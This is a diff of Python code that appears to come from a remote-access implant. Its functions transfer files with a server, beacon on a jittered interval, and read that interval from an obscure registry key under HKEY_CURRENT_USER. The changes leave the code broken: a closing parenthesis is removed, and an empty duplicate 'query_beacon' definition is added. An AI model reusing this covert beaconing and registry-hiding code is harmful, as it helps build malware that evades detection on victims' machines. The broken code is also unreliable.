@@ -210,7 +210,7 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
     except:
         if VERBOSE:
             print_fail("IO Error - Unable to Write File from Server")
-            send_data(conn, "INVALID DESTINATION PATH")
+            send_data(conn, "INVALID DESTINATION PATH"
 
 def beacon(conn, data):
     global BEACON_INTERVAL_SETTING
@@ -359,11 +359,13 @@ def query_beacon():
     global BEACON_INTERVAL_SETTING
     access_registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
     try:
-        k = winreg.OpenKey(access_registry,r"Software\Classes\.s")
+        k = winreg.OpenKey(access_registry,r"Software\Classes\.savep")
         BEACON_INTERVAL_HDD = int(winreg.QueryValue(k,None))
         BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
     except:
         BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
+
+def query_beacon():
 
 def beacon_drift(value=30):
     left_bound = 0
